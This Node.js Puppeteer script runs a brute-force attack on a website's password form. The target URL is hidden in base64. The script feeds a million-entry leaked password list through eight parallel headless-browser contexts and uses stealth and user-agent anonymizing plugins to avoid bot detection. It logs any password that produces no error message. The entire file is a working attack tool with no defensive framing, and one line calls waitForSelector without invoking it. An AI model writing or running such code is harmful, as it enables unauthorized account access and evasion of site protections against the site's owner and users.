const faker = require('faker');
const {
    Cluster
} = require('puppeteer-cluster')
const vanillaPuppeteer = require('puppeteer')
const txtgen = require('txtgen');
const {
    addExtra
} = require('puppeteer-extra')
const Stealth = require('puppeteer-extra-plugin-stealth')
const Recaptcha = require('puppeteer-extra-plugin-recaptcha');
const AdblockerPlugin = require('puppeteer-extra-plugin-adblocker')
const {
    fake
} = require('faker');
const userAgent = require('user-agents');
const publicIp = require('public-ip');
var fs = require('fs');


async function main() {
    // Create a custom puppeteer-extra instance using `addExtra`,
    // so we could create additional ones with different plugin config.
    const puppeteer = addExtra(vanillaPuppeteer)
    puppeteer.use(Stealth())
    puppeteer.use(AdblockerPlugin({
        blockTrackers: true
    }))
    puppeteer.use(require('puppeteer-extra-plugin-anonymize-ua')())
    puppeteer.use(require('puppeteer-extra-plugin-block-resources')({
        blockedTypes: new Set(['image', 'stylesheet', 'media'])
    }))

    const cluster = await Cluster.launch({
        concurrency: Cluster.CONCURRENCY_CONTEXT,
        maxConcurrency: 8,
        timeout: 1000000,
        puppeteerOptions: {
            headless: false
        }
    });
    // Event handler to be called in case of problems
    cluster.on('taskerror', (err, data) => {
        console.log(`Exception in ${data}: ${err.message}`);
    });

    await cluster.task(async ({
        page,
        data: {
            url,
            password
        }
    }) => {
        await page.goto(url, {
            waitUntil: 'networkidle0',
            timeout: 0
        });
        // await page.setViewport({
        //     width: 1920,
        //     height: 1080
        // });
        // await autoScroll(page)
        // await page.setRequestInterception(true);
        // page.on('request', (req) => {
        //     if (req.resourceType() === 'image') {
        //         req.abort();
        //     } else {
        //         req.continue();
        //     }
        // });

        await page.waitForSelector

        await page.evaluate(() => {
            document.querySelector('input.password-input').click();
        });

        await page.keyboard.type(password);
        await page.evaluate(() => {
            document.querySelector('button.arrow-icon').click();
        });

        await page.waitForTimeout(1000)
        let errorMessage = await page.evaluate(() => document.querySelector('div.error-message').innerText);
        if (errorMessage === '') {
            console.log(`Valid Password~! ${password}`)
        }

        // await page.keyboard.down('Control');
        // await page.keyboard.press('KeyA');
        // await page.keyboard.up('Control');
        // await page.keyboard.press('Backspace');

    });

    var passwordList = fs.readFileSync('./Passwords/xato-net-10-million-passwords-1000000.txt').toString().split("\n");

    for (i in passwordList) {
        cluster.queue({
            url: Buffer.from("aHR0cDovL3d3dy5tY2lsdWsuY29tLw==", 'base64').toString('binary'),
            password: passwordList[i]
        })
    }

    


    console.log(`Current Public IP: ${await publicIp.v4()}`)

    await cluster.idle();
    await cluster.close();
}

main().catch(console.warn)

async function autoScroll(page) {
    await page.evaluate(async () => {
        await new Promise((resolve, reject) => {
            var totalHeight = 0;
            var distance = 100;
            var timer = setInterval(() => {
                var scrollHeight = document.body.scrollHeight;
                window.scrollBy(0, distance);
                totalHeight += distance;

                if (totalHeight >= scrollHeight) {
                    clearInterval(timer);
                    resolve();
                }
            }, 100);
        });
    });
}